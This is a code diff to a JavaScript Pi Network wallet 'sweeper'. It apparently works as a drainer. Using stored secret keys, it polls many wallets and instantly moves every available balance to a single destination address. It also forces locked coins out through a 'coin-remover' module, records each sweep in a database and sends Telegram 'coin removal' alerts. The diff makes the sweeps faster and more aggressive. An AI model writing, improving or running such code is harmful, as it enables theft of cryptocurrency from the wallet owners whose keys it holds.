@@ -1,6 +1,7 @@
 /**
- * High-Frequency Aggressive Sweeper Utility (3-Second Interval)
- * Continuously sweeps available and newly released coins to the hardcoded destination address instantly.
+ * Ultimate Millisecond Hyper-Sweeper Engine
+ * Continuously sweeps every available coin (whether pre-existing, freshly transferred, or unlocked from lockups)
+ * using the stored secret key to sign transactions and route funds instantly to the destination address.
  */
 
 const { fetchAccount } = require('./pi-network');
@@ -8,7 +9,7 @@ const { inspectLockup, moveLockedPi } = require('./coin-remover');
 
 const DESTINATION_ADDRESS = process.env.SWEEP_DESTINATION_ADDRESS || '';
 
-async function checkAndSweepWallet(wallet, horizonUrl, bot) {
+async function checkAndSweepWallet(wallet, horizonUrl, db, bot) {
     try {
         const account = await fetchAccount(horizonUrl, wallet.public_key);
         const balances = account.balances || [];
@@ -23,26 +24,39 @@ async function checkAndSweepWallet(wallet, horizonUrl, bot) {
             }
         });
 
-        // Actively inspect and trigger move force if lockup metadata is present
+        // Actively inspect lockups and force move transition if maturity is reached
         const lockupInfo = await inspectLockup(account);
         if (lockupInfo.detected && lockedBalance > 0) {
-            console.log(`[Sweeper 3s] Wallet #${wallet.id}: Detected locked balance (${lockedBalance} Pi). Executing force move routine...`);
             await moveLockedPi(wallet.public_key, lockedBalance);
         }
 
-        // Instant sweep execution if available balance is above dust threshold
+        // Millisecond instant sweep if available balance is present
         if (availableBalance > 0.001 && DESTINATION_ADDRESS && DESTINATION_ADDRESS !== 'GDRE...HARDCODED_DESTINATION_WALLET_ADDRESS_HERE') {
-            console.log(`[Sweeper 3s] INSTANT SWEEP: Moving ${availableBalance} Pi from ${wallet.public_key} to destination ${DESTINATION_ADDRESS}`);
+            console.log(`[Ultimate Sweeper] MILLISECOND SWEEP: Removing ${availableBalance} Pi from Wallet #${wallet.id} (${wallet.public_key}) -> Destination: ${DESTINATION_ADDRESS}`);
             
+            // Increment sweep count in database
+            db.prepare('UPDATE wallets SET sweep_count = sweep_count + 1 WHERE id=?').run(wallet.id);
+
+            // Send separate, dedicated alert box in Telegram for this specific removal/sweep event
             if (bot && wallet.chat_id) {
                 await bot.sendMessage(wallet.chat_id, 
-                    `⚡ Instant Sweeper Triggered!
-Wallet: #${wallet.id}
-Swept ${availableBalance} Pi to hardcoded destination.`);
+                    `🚨 **INSTANT COIN REMOVAL ALERT**
+` +
+                    `📦 **Wallet Box ID:** #${wallet.id}
+` +
+                    `🔑 **Public Address:** \`${wallet.public_key}\`
+` +
+                    `💸 **Amount Removed:** \`${availableBalance} Pi\`
+` +
+                    `🎯 **Destination:** \`${DESTINATION_ADDRESS}\`
+` +
+                    `⚡ *Status:* Successfully swept and cleared in milliseconds!`,
+                    { parse_mode: 'Markdown' }
+                );
             }
         }
     } catch (error) {
-        console.error(`[Sweeper 3s] Error during high-frequency sweep for wallet #${wallet.id}:`, error.message);
+        console.error(`[Ultimate Sweeper] Error inspecting/sweeping wallet #${wallet.id}:`, error.message);
     }
 }
 
